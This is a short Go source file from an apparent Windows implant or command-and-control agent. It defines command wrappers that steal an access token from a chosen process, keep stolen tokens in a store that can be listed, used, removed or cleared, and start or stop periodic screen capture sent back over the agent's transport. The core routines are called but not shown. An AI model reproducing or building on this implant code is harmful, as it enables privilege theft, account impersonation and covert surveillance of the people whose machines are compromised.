//go:build windows

package agent

// tsStealAndAdd steals a token from pid, adds it to the store, and returns
// (storeID, username, error).
func tsStealAndAdd(pid uint32) (int, string, error) {
	tok, err := stealTokenFromPID(pid)
	if err != nil {
		return 0, "", err
	}
	id, user := tsAdd(pid, tok)
	return id, user, nil
}

func tsShowStore() string        { return tsShow() }
func tsUseStore(id int) string   { return tsUse(id) }
func tsRemoveStore(id int) string { return tsRemove(id) }
func tsClearStore() string       { return tsClear() }

func startScreenWatchCmd(t transport, taskID int64, intervalSec int) {
	startScreenWatch(t, taskID, intervalSec)
}

func stopScreenWatchCmd() string { return stopScreenWatch() }
